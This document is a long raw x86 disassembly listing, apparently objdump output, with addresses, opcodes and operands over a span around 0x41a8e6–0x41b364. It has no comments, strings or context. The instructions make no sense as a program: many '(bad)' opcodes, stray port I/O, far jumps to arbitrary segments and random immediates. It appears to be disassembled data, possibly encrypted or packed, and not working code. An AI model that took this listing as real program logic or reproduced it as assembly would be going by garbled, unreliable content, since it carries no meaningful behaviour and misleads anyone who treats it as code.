  41a8e6:	out    dx,eax
  41a8e7:	dec    eax
  41a8e8:	imul   esp,DWORD PTR [ebx-0x37],0xffffff81
  41a8ec:	stc    
  41a8ed:	loop   0x41a922
  41a8ef:	xor    al,BYTE PTR [edx+0x52ad905f]
  41a8f5:	xor    dh,BYTE PTR [edx]
  41a8f7:	lea    ebp,[ebp-0x76f32d08]
  41a8fd:	cs adc bh,ch
  41a900:	inc    esi
  41a901:	push   0xfffffffb
  41a903:	push   ebp
  41a904:	idiv   DWORD PTR [edi+0x47c4ce62]
  41a90a:	fdiv   QWORD PTR [edx-0x5f04f5a5]
  41a910:	adc    eax,0x809ea26e
  41a915:	dec    esi
  41a916:	ret    
  41a917:	loop   0x41a8e1
  41a919:	lea    eax,fs:0x895a3ede
  41a920:	push   ds
  41a921:	push   ebx
  41a922:	mov    edx,DWORD PTR [edi+0x23]
  41a925:	fwait
  41a926:	push   0x78
  41a928:	sbb    DWORD PTR [esi-0x3],0x5c
  41a92c:	sbb    BYTE PTR [ebp+edx*1+0x76],ch
  41a930:	cld    
  41a931:	ret    
  41a932:	and    edx,DWORD PTR [esi]
  41a934:	repnz xor esp,DWORD PTR [ebx-0x20]
  41a938:	lahf   
  41a939:	fnstcw WORD PTR [ecx+0x78]
  41a93c:	js     0x41a953
  41a93e:	aaa    
  41a93f:	xchg   esi,eax
  41a940:	out    dx,al
  41a941:	rol    DWORD PTR [eax],cl
	...
  41a9b3:	add    BYTE PTR [ebx],dh
  41a9b5:	xor    DWORD PTR [ebx+0x77e793c5],edx
  41a9bb:	idiv   DWORD PTR [ecx+0x569e3df1]
  41a9c1:	jl     0x41a9c3
  41a9c3:	jp     0x41a9ef
  41a9c5:	and    BYTE PTR [ecx],al
  41a9c7:	add    dh,dh
  41a9c9:	add    BYTE PTR [eax],al
  41a9cb:	add    bh,dl
  41a9cd:	aas    
  41a9ce:	pop    ebp
  41a9cf:	pop    ebx
  41a9d0:	xchg   ebx,eax
  41a9d1:	dec    ebp
  41a9d2:	test   eax,0x75f9e530
  41a9d7:	or     al,0xc9
  41a9d9:	(bad)  
  41a9da:	mov    ecx,0xfcff8aab
  41a9df:	popf   
  41a9e0:	loopne 0x41aa54
  41a9e2:	push   edx
  41a9e3:	xchg   ebp,eax
  41a9e4:	jne    0x41aa60
  41a9e6:	(bad)  
  41a9e8:	je     0x41aa09
  41a9ea:	in     eax,0x6
  41a9ec:	icebp  
  41a9ed:	jne    0x41a9f3
  41a9ef:	loopne 0x41a9a3
  41a9f1:	(bad)  
  41a9f2:	mov    cl,0x20
  41a9f4:	push   edi
  41a9f5:	sbb    bl,cl
  41a9f7:	mov    dl,0x6f
  41a9f9:	(bad)  
  41a9fa:	mov    ah,0x7
  41a9fc:	mov    dl,bh
  41a9fe:	mov    ebp,0xdcbed86c
  41aa03:	mov    ds:0xa3207097,al
  41aa08:	inc    esp
  41aa09:	cmove  ebx,DWORD PTR ds:0xc71c242f
  41aa10:	mov    ebx,0xef13d2ac
  41aa15:	in     eax,0x25
  41aa17:	and    BYTE PTR [ebx-0x31],dl
  41aa1a:	ins    BYTE PTR es:[edi],dx
  41aa1b:	sub    al,0x35
  41aa1d:	inc    eax
  41aa1e:	stc    
  41aa1f:	and    BYTE PTR [edi+ebp*1-0x43ebc5c8],ah
  41aa26:	mov    DWORD PTR [eax],edi
  41aa28:	push   es
  41aa29:	loop   0x41aa5c
  41aa2b:	sub    esi,0x96c92ca8
  41aa31:	in     al,0xaf
  41aa33:	mov    ecx,0x2bef44c5
  41aa38:	and    DWORD PTR [ecx+0x5c],ebx
  41aa3b:	into   
  41aa3c:	je     0x41aa75
  41aa3e:	ins    DWORD PTR es:[edi],dx
  41aa3f:	stos   BYTE PTR es:[edi],al
  41aa40:	mov    dh,0x7d
  41aa42:	or     al,0xdd
  41aa44:	push   eax
  41aa45:	or     dh,bl
  41aa47:	pmaxsw mm3,mm7
  41aa4a:	cmp    DWORD PTR [edi],ecx
  41aa4c:	cmp    DWORD PTR [ebx-0x1e],ebp
  41aa4f:	mov    WORD PTR [esi-0x7fcf4711],gs
  41aa55:	sar    DWORD PTR [ebx-0x44f7777d],1
  41aa5b:	pop    ds
  41aa5c:	cdq    
  41aa5d:	add    bh,ah
  41aa5f:	ret    
  41aa60:	push   esp
  41aa61:	or     ch,al
  41aa63:	and    eax,0x56a8638d
  41aa68:	das    
  41aa69:	cmp    al,0x24
  41aa6b:	push   edi
  41aa6c:	push   esi
  41aa6d:	push   esp
  41aa6e:	add    DWORD PTR [edi],eax
  41aa70:	in     al,dx
  41aa71:	mov    bl,0x45
  41aa73:	xchg   edi,eax
  41aa74:	cmp    dh,dh
  41aa76:	lock add ebx,DWORD PTR [edx+ebp*8]
  41aa7a:	jo     0x41aadb
  41aa7c:	xor    DWORD PTR [ecx],esi
  41aa7e:	push   ds
  41aa7f:	pop    edi
  41aa80:	nop
  41aa81:	xchg   ecx,eax
  41aa82:	push   eax
  41aa83:	mov    bl,0x69
  41aa85:	call   0xe558d373
  41aa8a:	stos   BYTE PTR es:[edi],al
  41aa8b:	js     0x41aa7d
  41aa8d:	jmp    0xc7a1ce09
  41aa92:	mov    eax,0xf7127273
  41aa97:	shl    DWORD PTR [edi],cl
  41aa99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa9a:	mov    dl,0x92
  41aa9c:	sub    ecx,DWORD PTR [edi+edi*4]
  41aa9f:	push   edi
  41aaa0:	inc    edx
  41aaa1:	hlt    
  41aaa2:	out    dx,eax
  41aaa3:	aam    0xa3
  41aaa5:	sti    
  41aaa6:	loop   0x41aa9f
  41aaa8:	xchg   edx,eax
  41aaa9:	(bad)  
  41aaaa:	aam    0xe4
  41aaac:	or     eax,0x1bd900b6
  41aab1:	shl    BYTE PTR [ecx+0x2535814d],cl
  41aab7:	scas   al,BYTE PTR es:[edi]
  41aab8:	push   es
  41aab9:	pop    esi
  41aaba:	aad    0xf4
  41aabc:	repnz arpl bx,di
  41aabf:	out    0x26,eax
  41aac1:	and    BYTE PTR [eax],al
	...
  41ab33:	add    BYTE PTR [edx-0x3c],cl
  41ab36:	cli    
  41ab37:	inc    edi
  41ab38:	(bad)  
  41ab39:	jg     0x41ab3a
  41ab3b:	int    0x91
  41ab3d:	pop    es
  41ab3e:	sbb    ecx,DWORD PTR [edi-0x37]
  41ab41:	push   es
  41ab42:	rol    BYTE PTR [eax+eiz*1],1
  41ab45:	and    DWORD PTR [ecx],eax
  41ab47:	add    dh,dh
  41ab49:	add    BYTE PTR [eax],al
  41ab4b:	add    BYTE PTR [ecx],bh
  41ab4d:	lds    esi,FWORD PTR [esi-0x3e3848ef]
  41ab53:	ficom  WORD PTR [edx]
  41ab55:	push   cs
  41ab56:	sbb    edi,DWORD PTR fs:[ecx]
  41ab59:	pushw  0xffff
  41ab5c:	dec    edi
  41ab5d:	outs   dx,DWORD PTR ds:[esi]
  41ab5e:	aad    0x6c
  41ab60:	mov    eax,ds:0xf01325f4
  41ab65:	dec    edx
  41ab66:	jbe    0x41ab85
  41ab68:	and    al,0x23
  41ab6a:	xchg   DWORD PTR [ecx-0x38b12afa],esi
  41ab70:	and    eax,0xc963da9e
  41ab75:	push   0x8f2a5de7
  41ab7a:	retf   0xa4b5
  41ab7d:	jmp    0x9153:0x94326884
  41ab84:	mov    al,0x3e
  41ab86:	lods   al,BYTE PTR ds:[esi]
  41ab87:	ret    0x31d8
  41ab8a:	sub    BYTE PTR [ebp-0x56c9f14a],0x34
  41ab91:	fsubr  QWORD PTR [ebp+0x61]
  41ab94:	pop    esp
  41ab95:	mov    ebp,0xe622c324
  41ab9a:	push   edx
  41ab9b:	sti    
  41ab9c:	pusha  
  41ab9d:	imul   ebx,DWORD PTR [edx-0x2b0cb444],0xfffffffc
  41aba4:	inc    edx
  41aba5:	test   al,0x4d
  41aba7:	mov    DWORD PTR [eax-0x71],edi
  41abaa:	pop    ebx
  41abab:	data16 sti 
  41abad:	stos   DWORD PTR es:[edi],eax
  41abae:	mov    eax,ds:0x1d3ddac9
  41abb3:	sbb    eax,DWORD PTR [esi+0x369d70d8]
  41abb9:	hlt    
  41abba:	sar    BYTE PTR [esi+0x3d],1
  41abbd:	or     DWORD PTR ds:0x42fb8f31,edx
  41abc3:	adc    esp,DWORD PTR [ebp+0x49e959e9]
  41abc9:	iret   
  41abca:	add    edi,edx
  41abcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abcd:	mov    esi,0xf80967aa
  41abd2:	mov    esi,0x9b067814
  41abd7:	fbstp  TBYTE PTR [ecx-0x7f3fc812]
  41abdd:	jae    0x41abfd
  41abdf:	push   cs
  41abe0:	in     eax,0x59
  41abe2:	shl    DWORD PTR [edi-0x60],cl
  41abe5:	gs inc ebp
  41abe7:	mov    ebp,0x8091616
  41abec:	imul   ebp,ecx,0x78
  41abef:	popf   
  41abf0:	repz test eax,0x3db7e7df
  41abf6:	xor    edx,ecx
  41abf8:	jae    0x41ab9f
  41abfa:	int    0x79
  41abfc:	pushf  
  41abfd:	sub    dl,dl
  41abff:	push   ebp
  41ac00:	aaa    
  41ac01:	into   
  41ac02:	sbb    ecx,ecx
  41ac04:	mov    edx,0xb283b56c
  41ac0a:	inc    ebx
  41ac0b:	xchg   edx,eax
  41ac0c:	cmpxchg BYTE PTR es:[ecx-0x1e],cl
  41ac11:	sbb    DWORD PTR [eax+0x68],esi
  41ac14:	sub    ecx,DWORD PTR [eax+0x7e]
  41ac17:	ja     0x41ac3b
  41ac19:	vcmpss xmm6,xmm5,DWORD PTR [esi],0xc5
  41ac1e:	adc    edx,0x7c
  41ac21:	shl    ecx,cl
  41ac23:	cwde   
  41ac24:	add    eax,0x1ed37d29
  41ac29:	xchg   ecx,eax
  41ac2a:	into   
  41ac2b:	mov    WORD PTR [eax+0x7b],fs
  41ac2e:	pop    esi
  41ac2f:	ror    DWORD PTR [esp+ecx*1-0x810a94b],1
  41ac36:	(bad)  
  41ac37:	jne    0x41ac72
  41ac39:	cld    
  41ac3a:	xor    edi,esi
  41ac3c:	fisttp DWORD PTR [ebp-0x61]
  41ac3f:	std    
  41ac40:	sub    eax,0xdb
	...
  41acb1:	add    BYTE PTR [eax],al
  41acb3:	add    al,dh
  41acb5:	xchg   edi,eax
  41acb6:	std    
  41acb7:	cmp    al,0xff
  41acb9:	jle    0x41acac
  41acbb:	fisttp WORD PTR [esi+0x20]
  41acbe:	cmp    eax,0x3b2cf302
  41acc3:	mov    al,ds:0x12216
  41acc8:	test   BYTE PTR [eax],0x0
  41accb:	add    dl,bl
  41accd:	outs   dx,DWORD PTR ds:[esi]
  41acce:	pop    esi
  41accf:	lea    ebx,[ebp-0x4a824739]
  41acd5:	add    al,0x1f
  41acd7:	stos   DWORD PTR es:[edi],eax
  41acd8:	add    eax,0xfc406b3a
  41acdd:	mov    edi,esi
  41acdf:	iret   
  41ace0:	lock jnp 0x41ad5b
  41ace3:	loope  0x41acd4
  41ace5:	(bad)
  41ace8:	pop    ecx
  41ace9:	or     DWORD PTR [ebx],0x8a6810c4
  41acef:	and    ecx,ebp
  41acf1:	mov    al,0xf8
  41acf3:	js     0x41acc1
  41acf5:	jg     0x41ad64
  41acf7:	stos   WORD PTR es:[edi],ax
  41acf9:	les    ecx,FWORD PTR [eax+ecx*2+0x7]
  41acfd:	fisubr DWORD PTR [edx+0x4fa5f5c7]
  41ad03:	mov    edx,0x3e60f9f0
  41ad08:	mov    ebp,0x87063aaa
  41ad0d:	push   ebx
  41ad0e:	push   edx
  41ad0f:	xchg   ecx,eax
  41ad10:	out    0x1e,eax
  41ad12:	es stc 
  41ad14:	std    
  41ad15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad16:	mov    ebp,0x8391a36d
  41ad1b:	jge    0x41ad34
  41ad1d:	not    bl
  41ad1f:	popf   
  41ad20:	or     ecx,ebx
  41ad22:	jle    0x41acde
  41ad24:	fcomp  DWORD PTR [ebx-0x2d7d06de]
  41ad2a:	(bad)  
  41ad2b:	jmp    0xaa14:0x337b2169
  41ad32:	cmp    BYTE PTR [ecx+0x112310fb],0xf8
  41ad39:	imul   edi,eax,0x65e6ab59
  41ad3f:	jmp    0x41ada6
  41ad41:	inc    esp
  41ad42:	jg     0x41acf7
  41ad44:	cmp    esp,DWORD PTR [ebx+0x34]
  41ad47:	out    0xa9,al
  41ad49:	ja     0x41ad86
  41ad4b:	jmp    0x4154:0x24401df2
  41ad52:	cmp    DWORD PTR [ecx-0x64],ecx
  41ad55:	mov    ebx,0xe0d2831b
  41ad5a:	mov    al,0x14
  41ad5c:	mov    eax,0x800a014f
  41ad61:	es lock jae 0x41ad1f
  41ad65:	dec    eax
  41ad66:	adc    eax,0x8b85fc2
  41ad6b:	adc    bl,BYTE PTR [esi-0x72008bd7]
  41ad71:	fcom   QWORD PTR [eax-0x164d5f40]
  41ad77:	cmp    edx,DWORD PTR [ebp-0x4f]
  41ad7a:	dec    edi
  41ad7b:	and    al,0x4b
  41ad7d:	fnstenv [ecx]
  41ad7f:	outs   dx,DWORD PTR ds:[esi]
  41ad80:	cmp    DWORD PTR [ebx+0x4154c8ad],ecx
  41ad86:	sbb    dl,BYTE PTR [ebp-0x6e6ad6b5]
  41ad8c:	cmp    ch,al
  41ad8e:	push   edx
  41ad8f:	test   BYTE PTR [ebp-0x5a77ab4e],ah
  41ad95:	adc    eax,0x1b7c908
  41ad9a:	adc    cl,dl
  41ad9c:	pop    ebp
  41ad9d:	mov    ebp,0x4b122f2f
  41ada2:	(bad)  
  41ada3:	jns    0x41ada9
  41ada5:	mov    ah,0xdd
  41ada7:	adc    BYTE PTR [esi+esi*2+0x38],0xec
  41adac:	ror    DWORD PTR [edx+0x5c],cl
  41adaf:	mov    ds:0xd52f009b,eax
  41adb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adb5:	enter  0x4e42,0xbd
  41adb9:	push   esp
  41adba:	mov    ch,0xe3
  41adbc:	and    DWORD PTR ds:0x37b2a0ff,edi
	...
  41ae32:	add    BYTE PTR [eax],al
  41ae34:	xchg   eax,ebx
  41ae36:	pop    ss
  41ae37:	lds    ebx,FWORD PTR [edi-0x31]
  41ae3a:	xlat   BYTE PTR ds:[ebx]
  41ae3b:	ficom  DWORD PTR [edi+0x577741d]
  41ae41:	cmp    eax,0x230cbc47
  41ae46:	add    DWORD PTR [eax],eax
  41ae48:	test   BYTE PTR [eax],0x0
  41ae4b:	add    BYTE PTR [esi+0x7b10470e],cl
  41ae51:	xor    eax,0x9221fab
  41ae56:	int    0x15
  41ae58:	lods   eax,DWORD PTR ds:[esi]
  41ae59:	(bad)  
  41ae5b:	xlat   BYTE PTR ds:[ebx]
  41ae5c:	sbb    al,BYTE PTR [ebp-0x62]
  41ae5f:	ds dec ebx
  41ae61:	test   DWORD PTR [esi-0xe],0xaccfb18e
  41ae68:	xor    edx,0x34
  41ae6b:	pop    esp
  41ae6c:	cmp    al,BYTE PTR [eax]
  41ae6e:	test   DWORD PTR [edi-0x3c],eax
  41ae71:	in     al,dx
  41ae72:	jmp    0xed92689e
  41ae77:	and    bl,BYTE PTR [ebx+0x12]
  41ae7a:	(bad)  
  41ae7b:	fisttp WORD PTR [edi-0x4b467509]
  41ae81:	inc    edi
  41ae82:	push   ss
  41ae83:	stos   DWORD PTR es:[edi],eax
  41ae84:	imul   esi,DWORD PTR [edx-0x7f],0x66ced2db
  41ae8b:	fdiv   QWORD PTR [eax+0x7f]
  41ae8e:	mov    al,ds:0xfcdcb3b1
  41ae93:	addr16 loope 0x41ae72
  41ae96:	fwait
  41ae97:	and    ah,BYTE PTR [ebx+0x2e30e685]
  41ae9d:	mov    ebx,0x1f4f6f69
  41aea2:	cmp    edi,DWORD PTR [ecx+0x7d]
  41aea5:	push   cs
  41aea6:	outs   dx,BYTE PTR ds:[esi]
  41aea7:	dec    ebx
  41aea8:	and    ah,BYTE PTR [edx-0x1c]
  41aeab:	popf   
  41aeac:	or     al,BYTE PTR [edx+0x630e36e1]
  41aeb2:	popf   
  41aeb3:	repnz out 0x99,al
  41aeb6:	lods   al,BYTE PTR ds:[esi]
  41aeb7:	mov    ebx,tr5
  41aeba:	fiadd  DWORD PTR [ebp-0x497a9dea]
  41aec0:	rcl    BYTE PTR [esi+0x3c],1
  41aec3:	cld    
  41aec4:	jnp    0x41ae6d
  41aec6:	xchg   edi,eax
  41aec7:	inc    ecx
  41aec8:	sbb    cl,0xe0
  41aecb:	test   DWORD PTR [esi+0x0],eax
  41aece:	call   0xb92a:0xd306421c
  41aed5:	mov    eax,0x28d8b430
  41aeda:	out    0xae,eax
  41aedc:	and    edi,esi
  41aede:	pop    ebx
  41aee0:	sbb    DWORD PTR [edi-0x66ce487c],esi
  41aee6:	jg     0x41aef1
  41aee8:	and    dh,ch
  41aeea:	or     al,0x8
  41aeec:	ja     0x41af4f
  41aeee:	push   ss
  41aeef:	dec    edi
  41aef0:	lahf   
  41aef1:	mov    WORD PTR [edx],ss
  41aef3:	cmp    BYTE PTR [ebx-0x4ef9f191],cl
  41aef9:	xchg   edx,eax
  41aefa:	jmp    0x4d85:0xe1b8c1f5
  41af01:	push   es
  41af02:	dec    edi
  41af03:	ficomp DWORD PTR [edi+0x1cac8e3e]
  41af09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af0a:	pop    es
  41af0b:	inc    ebp
  41af0c:	and    al,0x28
  41af0e:	ins    BYTE PTR es:[edi],dx
  41af0f:	jmp    0x23a8:0x460e83fd
  41af16:	daa    
  41af17:	mov    esp,ebx
  41af19:	call   0xb834fb7c
  41af1e:	push   eax
  41af1f:	test   eax,0x2e7315a1
  41af24:	push   0x133eac85
  41af29:	int    0x52
  41af2b:	pop    ds
  41af2c:	nop
  41af2d:	out    0x14,al
  41af2f:	mov    dh,0x11
  41af31:	loope  0x41afb1
  41af33:	mov    bl,0xa2
  41af35:	(bad)  [ebx+0x5cc3d908]
  41af3b:	sbb    dl,0xb1
  41af3e:	adc    eax,0x188d32
	...
  41afb3:	add    BYTE PTR [esi-0x15],cl
  41afb6:	sub    cl,BYTE PTR [esi-0x51]
  41afb9:	iret   
  41afba:	outs   dx,BYTE PTR ds:[esi]
  41afbb:	jmp    0x41af3d
  41afbd:	rcl    DWORD PTR [esi+0x1d],0x4a
  41afc1:	aam    0xd2
  41afc3:	xor    al,BYTE PTR [edx]
  41afc5:	and    al,0x1
  41afc7:	add    dh,dh
  41afc9:	add    BYTE PTR [eax],al
  41afcb:	add    BYTE PTR [ebx-0x1c],ah
  41afce:	fucomi st,st(3)
  41afd0:	ror    bl,1
  41afd2:	adc    al,0x84
  41afd4:	stos   BYTE PTR es:[edi],al
  41afd5:	mov    al,bh
  41afd7:	(bad)  [edx+0x2]
  41afda:	in     al,0x82
  41afdc:	mov    ebx,0x23e085ad
  41afe1:	pop    ss
  41afe2:	out    0x8a,eax
  41afe4:	inc    ecx
  41afe5:	cmp    al,0xb6
  41afe7:	outs   dx,BYTE PTR ds:[esi]
  41afe8:	sub    bl,BYTE PTR [edi+0x561d4cec]
  41afee:	enter  0x5ecf,0x79
  41aff2:	sbb    esp,DWORD PTR [edi]
  41aff4:	jae    0x41b055
  41aff6:	push   esi
  41aff7:	test   al,0xb6
  41aff9:	mov    BYTE PTR [ebx+esi*4+0x6d],dh
  41affd:	cmp    ecx,DWORD PTR [ecx+0x2315ffa4]
  41b003:	mov    es:0xf80b4050,eax
  41b009:	sbb    ebp,DWORD PTR [ecx+ebx*1+0x66]
  41b00d:	mov    ebp,0x17eba8f7
  41b012:	mov    bh,0xf4
  41b014:	push   esi
  41b015:	ss cmc 
  41b017:	out    dx,eax
  41b018:	adc    ebx,0x34
  41b01b:	in     eax,dx
  41b01c:	dec    esp
  41b01d:	in     al,0xd7
  41b01f:	mov    bh,0x78
  41b021:	sbb    DWORD PTR [edi+0x217f6b26],esp
  41b027:	(bad)  
  41b028:	retf   0x17ed
  41b02b:	adc    dl,al
  41b02d:	out    dx,eax
  41b02e:	dec    ebp
  41b02f:	out    0x4a,eax
  41b031:	sahf   
  41b032:	stos   DWORD PTR es:[edi],eax
  41b033:	rol    BYTE PTR [ecx+0x1045ac21],cl
  41b039:	enter  0x378c,0xdb
  41b03d:	jo     0x41b02c
  41b03f:	lea    edx,[eax-0x49]
  41b042:	mov    esp,0x80ab467b
  41b047:	(bad)  
  41b048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b049:	lahf   
  41b04a:	sbb    edi,DWORD PTR [edi-0x1491d393]
  41b050:	mov    ch,BYTE PTR [edx+0x7d05b82d]
  41b056:	repz sbb edx,DWORD PTR [eax+eiz*2-0x49]
  41b05b:	int3   
  41b05c:	jg     0x41b0a9
  41b05e:	into   
  41b05f:	jecxz  0x41b05a
  41b061:	data16 icebp 
  41b063:	fld    DWORD PTR [ecx]
  41b065:	adc    DWORD PTR [bp+di],ebx
  41b068:	test   al,0xf3
  41b06a:	sbb    al,0x34
  41b06c:	cwde   
  41b06d:	pop    edi
  41b06e:	and    eax,0x936db0c6
  41b073:	sbb    DWORD PTR [esi],edi
  41b075:	sbb    ecx,DWORD PTR ds:0x2c24fcc2
  41b07b:	xchg   edx,eax
  41b07c:	push   esp
  41b07d:	xor    esi,DWORD PTR [ebx+0x12]
  41b080:	dec    DWORD PTR ds:0xa43c5a06
  41b086:	sub    DWORD PTR [ebp-0x79],esp
  41b089:	lods   al,BYTE PTR ds:[esi]
  41b08a:	jne    0x41b077
  41b08c:	call   0xaf54:0x87a2a741
  41b093:	es (bad) 
  41b095:	in     eax,dx
  41b096:	out    0xbd,al
  41b098:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b099:	scas   eax,DWORD PTR es:[edi]
  41b09a:	jle    0x41b09d
  41b09c:	adc    DWORD PTR [ebx-0x425950a3],edx
  41b0a2:	mov    bl,0xc
  41b0a4:	or     DWORD PTR [ebx],ebx
  41b0a6:	mov    ds:0xc247f99,al
  41b0ab:	sar    al,0x87
  41b0ae:	test   DWORD PTR [edi+0x47f4ff44],ebp
  41b0b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b5:	xchg   esi,eax
  41b0b6:	rol    BYTE PTR ds:0x2b5ba0a6,cl
  41b0bc:	jb     0x41b08c
  41b0be:	rcr    DWORD PTR [eax-0x2d],cl
  41b0c1:	or     DWORD PTR [eax],eax
	...
  41b133:	add    BYTE PTR [esp+ecx*1],bl
  41b136:	std    
  41b137:	sbb    ebp,edi
  41b139:	stc    
  41b13a:	cld    
  41b13b:	or     eax,0x64289710
  41b140:	adc    edi,DWORD PTR [ebx+0x66]
  41b143:	xlat   BYTE PTR ds:[ebx]
  41b144:	clc    
  41b145:	and    al,0x1
  41b147:	add    dh,dh
  41b149:	add    BYTE PTR [eax],al
  41b14b:	add    ah,cl
  41b14d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b14e:	mov    es:0x3dafd0e0,eax
  41b154:	test   DWORD PTR [ebx],esi
  41b156:	sbb    al,0xd9
  41b158:	cdq    
  41b159:	aaa    
  41b15a:	test   eax,0x80fac7b3
  41b15f:	jg     0x41b109
  41b161:	sbb    bl,BYTE PTR [esi+0x5c6c9b1a]
  41b167:	aas    
  41b168:	outs   dx,BYTE PTR ds:[esi]
  41b169:	jmp    0x41b1a9
  41b16b:	xchg   esi,eax
  41b16c:	pop    ds
  41b16d:	rcl    esi,cl
  41b16f:	iret   
  41b170:	sti    
  41b171:	push   0xffffffc2
  41b173:	lahf   
  41b174:	or     eax,0x73ae9155
  41b179:	and    ebp,esi
  41b17b:	dec    ebp
  41b17c:	dec    edi
  41b17d:	shl    DWORD PTR [edx+0x3c],cl
  41b180:	mov    dl,0x3c
  41b182:	dec    ebx
  41b183:	repz pop eax
  41b185:	xchg   edi,eax
  41b186:	cmp    DWORD PTR [eax-0x3c],0xffffffdd
  41b18a:	inc    esi
  41b18b:	stos   DWORD PTR es:[edi],eax
  41b18c:	mov    al,0x15
  41b18e:	add    BYTE PTR [esi-0x73],dl
  41b191:	add    eax,0x8c69d136
  41b196:	jno    0x41b1ad
  41b198:	cmc    
  41b199:	fwait
  41b19a:	ins    BYTE PTR es:[edi],dx
  41b19b:	lods   eax,DWORD PTR ds:[esi]
  41b19c:	jmp    0xda93:0x12007904
  41b1a3:	mov    ch,0x23
  41b1a5:	jmp    0x48c4:0x41e1c305
  41b1ac:	and    eax,0x187ec5b
  41b1b1:	push   esi
  41b1b2:	push   esi
  41b1b3:	fild   QWORD PTR [ecx+0x4c]
  41b1b6:	int3   
  41b1b7:	scas   al,BYTE PTR es:[edi]
  41b1b8:	jmp    0xd2d6:0x632e88cd
  41b1bf:	jmp    0xad70306f
  41b1c4:	pop    ss
  41b1c5:	dec    edx
  41b1c6:	dec    esp
  41b1c7:	(bad)  
  41b1c9:	fwait
  41b1ca:	jb     0x41b1e3
  41b1cc:	je     0x41b1f2
  41b1ce:	mov    edi,0x7e08ba70
  41b1d3:	add    dh,bl
  41b1d5:	add    eax,0x35cb3481
  41b1da:	or     eax,0xba6a6705
  41b1df:	in     al,0x52
  41b1e1:	and    ch,0x4e
  41b1e4:	mov    esp,0x5fcd4bc2
  41b1e9:	icebp  
  41b1ea:	pop    ebp
  41b1eb:	cmp    esi,DWORD PTR [esp+edx*8]
  41b1ee:	cli    
  41b1ef:	push   0x55
  41b1f1:	jp     0x41b1aa
  41b1f3:	lock xor al,0xe2
  41b1f6:	mov    al,0xbc
  41b1f8:	xlat   BYTE PTR ds:[ebx]
  41b1f9:	dec    edx
  41b1fa:	jns    0x41b1be
  41b1fc:	push   eax
  41b1fd:	out    dx,al
  41b1fe:	jp     0x41b243
  41b200:	ja     0x41b21b
  41b202:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b203:	dec    ebp
  41b204:	push   cs
  41b205:	mov    edi,0xca0361bf
  41b20a:	inc    edi
  41b20b:	lods   eax,DWORD PTR ds:[esi]
  41b20c:	pop    eax
  41b20d:	outs   dx,DWORD PTR ds:[esi]
  41b20e:	push   ebx
  41b20f:	xlat   BYTE PTR ds:[ebx]
  41b210:	shr    BYTE PTR [eax],0xfa
  41b213:	jp     0x41b27c
  41b215:	push   eax
  41b216:	inc    esi
  41b217:	jmp    0x41b290
  41b219:	(bad)  
  41b21a:	popa   
  41b21b:	dec    ecx
  41b21c:	xlat   BYTE PTR ds:[ebx]
  41b21d:	popa   
  41b21e:	cmc    
  41b21f:	nop
  41b220:	fcomi  st,st(0)
  41b222:	in     eax,0xd4
  41b224:	jb     0x41b1c6
  41b226:	jmp    0xdc9095e8
  41b22b:	xor    ch,bl
  41b22d:	mov    dl,0xaf
  41b22f:	mov    ebp,0x35b7e121
  41b234:	and    al,0x28
  41b236:	push   ecx
  41b237:	mov    esi,0xb3126a37
  41b23c:	add    eax,0x8dcc9d90
  41b241:	jns    0x41b243
	...
  41b2b3:	add    bh,dh
  41b2b5:	pop    eax
  41b2b6:	test   al,0x13
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	repz (bad) 
  41b2bb:	cld    
  41b2bc:	cmp    ch,bh
  41b2be:	jl     0x41b2c7
  41b2c0:	fidivr WORD PTR [edx+ebx*2+0x3e]
  41b2c4:	out    dx,al
  41b2c5:	and    eax,0xf60001
  41b2ca:	add    BYTE PTR [eax],al
  41b2cc:	mov    edx,0xf464b08a
  41b2d1:	lahf   
  41b2d2:	or     bh,BYTE PTR [ebx+0x32]
  41b2d5:	push   0xedeac4c1
  41b2da:	jmp    0x41b286
  41b2dc:	inc    ecx
  41b2dd:	jae    0x41b27a
  41b2df:	(bad)  
  41b2e0:	sbb    eax,0x2e3c7eaa
  41b2e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e6:	nop
  41b2e7:	mov    fs,esp
  41b2e9:	mov    BYTE PTR [ebx-0xd253e4a],cl
  41b2ef:	jl     0x41b36e
  41b2f1:	xor    ecx,DWORD PTR [ebp+0x4d]
  41b2f4:	gs (bad) 
  41b2f6:	jne    0x41b2cd
  41b2f8:	cmp    al,0x19
  41b2fa:	xor    eax,0x85604dd4
  41b2ff:	pushf  
  41b300:	mov    cl,0x24
  41b302:	inc    esi
  41b303:	pop    ecx
  41b304:	mov    esi,0x5fc40751
  41b309:	and    eax,0x1384114
  41b30e:	ja     0x41b38b
  41b310:	inc    ebx
  41b311:	and    DWORD PTR [esi+0x1af73def],eax
  41b317:	sub    BYTE PTR [esi+0x4e0370b9],0x6
  41b31e:	mov    dl,0x77
  41b320:	lock gs out 0x6e,eax
  41b324:	jle    0x41b33f
  41b326:	out    0xe8,al
  41b328:	dec    edx
  41b329:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b32a:	push   ebx
  41b32b:	in     eax,0x9
  41b32d:	cmp    esp,ebp
  41b32f:	mov    al,0xd1
  41b331:	cmp    DWORD PTR [edx],esp
  41b333:	mov    eax,ds:0xfed4d021
  41b338:	jge    0x41b305
  41b33a:	xchg   ebx,eax
  41b33b:	outs   dx,DWORD PTR ds:[esi]
  41b33c:	adc    eax,edx
  41b33e:	out    dx,al
  41b33f:	out    dx,eax
  41b340:	leave  
  41b341:	jp     0x41b37a
  41b343:	gs clc 
  41b345:	jl     0x41b3ac
  41b347:	data16 icebp 
  41b349:	je     0x41b2ff
  41b34b:	inc    ecx
  41b34c:	inc    ebp
  41b34d:	sbb    BYTE PTR [esi-0x50336bf8],dh
  41b353:	add    eax,DWORD PTR [ecx+0x3d1cb92b]
  41b359:	loope  0x41b32a
  41b35b:	ror    dl,1
  41b35d:	sbb    dl,BYTE PTR [edi+esi*1-0x3b723777]
  41b364:	out    dx,eax
